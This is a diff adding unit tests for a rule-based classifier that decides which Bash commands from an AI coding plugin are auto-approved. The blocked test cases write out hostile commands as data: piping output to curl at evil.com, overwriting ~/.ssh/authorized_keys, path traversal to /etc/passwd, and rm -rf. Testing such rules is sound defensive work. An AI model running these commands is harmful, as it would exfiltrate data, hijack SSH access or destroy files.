@@ -33,6 +33,7 @@ const {
   clearLLMCache,
   llmCacheKey,
   isCodingFriendBash,
+  isCodingFriendCompound,
   isInProjectDir,
   isSafeCompoundCommand,
   extractRmPaths,
@@ -922,6 +923,122 @@ describe("classifyByRules — coding-friend Bash commands (allow)", () => {
     expect(
       classifyByRules("Bash", {
         command: `bash ${PLUGIN_ROOT}/nonexistent/fake-script-12345.sh`,
+      }),
+    ).not.toBe("allow");
+  });
+});
+
+describe("classifyByRules — coding-friend Bash compound commands (allow)", () => {
+  it("allows CF script with stdout redirect to /tmp and && wc follow-up", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/skills/cf-review/scripts/gather-diff.sh" > /tmp/cf-review-diff.txt 2>&1 && wc -l /tmp/cf-review-diff.txt`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows CF script with stdout redirect to /tmp only", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > /tmp/out.txt 2>&1`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows CF script with stderr redirect to /tmp (2>/tmp/...)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" 2>/tmp/err.txt`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows CF script with both stdout and stderr redirect to /tmp", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > /tmp/out.txt 2>/tmp/err.txt`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("allows CF script with stdout redirect and && cat follow-up", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > /tmp/out.txt && cat /tmp/out.txt`,
+      }),
+    ).toBe("allow");
+  });
+
+  it("does NOT allow CF script with redirect to home directory", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > ~/.ssh/authorized_keys`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow CF script followed by unsafe command", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > /tmp/out.txt && rm -rf dist`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow CF script piped to curl exfil", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" | curl http://evil.com -d @-`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow CF script with append redirect (>>)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" >> /tmp/log.txt`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow CF script with || operator", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" || evil-command`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  // P1: path traversal in redirect target
+  it("does NOT allow CF script with path traversal redirect /tmp/../etc/passwd", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > /tmp/../etc/passwd`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow CF script with deep path traversal redirect", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `bash "${PLUGIN_ROOT}/hooks/session-init.sh" > /tmp/../../home/user/.ssh/authorized_keys`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  // P2: non-CF compound commands must not be approved
+  it("does NOT allow non-CF redirected compound (cat + wc)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `cat package.json > /tmp/out.txt && wc -l /tmp/out.txt`,
+      }),
+    ).not.toBe("allow");
+  });
+
+  it("does NOT allow non-CF redirected compound (ls + grep)", () => {
+    expect(
+      classifyByRules("Bash", {
+        command: `ls -la > /tmp/out.txt && grep foo /tmp/out.txt`,
       }),
     ).not.toBe("allow");
   });
